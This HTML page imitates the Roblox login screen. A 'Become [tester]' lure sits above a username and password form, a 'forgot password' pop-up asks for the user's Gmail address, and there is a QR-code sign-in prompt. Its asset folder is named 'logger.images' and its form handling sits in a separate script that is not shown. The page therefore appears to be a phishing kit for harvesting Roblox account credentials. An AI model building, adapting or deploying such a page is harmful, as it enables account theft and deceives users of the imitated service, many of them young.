<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <script src="java.js" defer></script>
    <link rel="icon" href="logger.images/Roblox_Logo_2025.png" type="image/png">
</head>
<body>
    <div class="container">
        <!-- Navigation Bar -->
        <nav class="navbar">
            <div class="nav-left">
                <div class="logo">
                    <a href="index.html">
                        <div class="logo-square">
                            <img src="logger.images/robloxLogo.png" alt="Roblox Logo" class="logo-image" style="width:32px; height:32px;">
                        </div>
                    </a>
                </div>
                <div class="nav-links">
                    <a href="#" class="nav-link">Charts</a>
                    <a href="#" class="nav-link">Marketplace</a>
                    <a href="#" class="nav-link">Create</a>
                    <a href="#" class="nav-link">Robux</a>
                </div>
            </div>
            <div class="nav-right">
                <div class="search-container">
                    <svg class="search-icon" width="16" height="16" viewBox="0 0 24 24" fill="none">
                        <path d="M21 21L16.514 16.506L21 21ZM19 10.5C19 15.194 15.194 19 10.5 19C5.806 19 2 15.194 2 10.5C2 5.806 5.806 2 10.5 2C15.194 2 19 5.806 19 10.5Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                    <input type="text" placeholder="Search" class="search-input">
                </div>
                <button class="signup-btn">Login</button>
            </div>
        </nav>

        <div class="Tester_title">Become&nbsp;<span style="color: rgb(99, 13, 13);">[tester]</span></div>

        <!-- Login Form -->
        <div class="login-container">
            <div class="login-card">
                <h1 class="login-title">Login to Roblox</h1>

                <form id="loginForm" class="login-form">
                    <input type="text" id="username" placeholder="Username/Email/Phone" class="form-input" required>
                    <input type="password" id="password" placeholder="Password" class="form-input" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>

                <a href="#" class="forgot-link" id="forgotLink" style="color:#bbb; text-decoration:underline;">Forgot Password or Username?</a>
                <div id="forgotFrame" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.85); align-items:center; justify-content:center; z-index:999;">
                    <div style="background:#181818; padding:28px 32px; border-radius:12px; text-align:center; position:relative; box-shadow:0 4px 24px rgba(0,0,0,0.7); color:#eee;">
                        <span id="closeForgot" style="position:absolute; top:10px; right:16px; cursor:pointer; font-size:22px; color:#bbb;">&times;</span>
                        <h2 style="color:#fff; margin-bottom:16px;">Enter gmail</h2>
                        <input type="email" id="forgotEmail" placeholder="Enter your Gmail" style="width:80%; padding:10px; margin:14px 0; border-radius:6px; border:1px solid #333; background:#222; color:#eee;">
                        <button id="sendForgotBtn" style="padding:10px 22px; background:#222; color:#fff; border:none; border-radius:6px; font-weight:600; cursor:pointer; margin-top:8px;">Send</button>
                        <div id="forgotMsg" style="margin-top:14px; color:#4caf50; display:none;">A message has been sent to your email.</div>
                    </div>
                </div>
                

                <div class="alternative-options">
                    <button class="alt-btn" id="qrBtn">Scan QR code</button>
                    <div id="qrPrompt" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); align-items:center; justify-content:center; z-index:999;">
                        <div style="background:#fff; padding:24px; border-radius:8px; text-align:center; position:relative;">
                            <span id="closeQr" style="position:absolute; top:8px; right:12px; cursor:pointer; font-size:20px;">&times;</span>
                            <p>Scan this QR code:</p>
                            <img id="qrImage" src="" alt="QR Code" style="width:180px; height:180px;">
                        </div>
                    </div>
                </div>

                <p class="signup-text">Don't have an account? <a href="https://www.roblox.com/signup" class="signup-link" target="_blank">Sign Up on Roblox</a></p>
            </div>
        </div>
    </div>
</body>
</html>
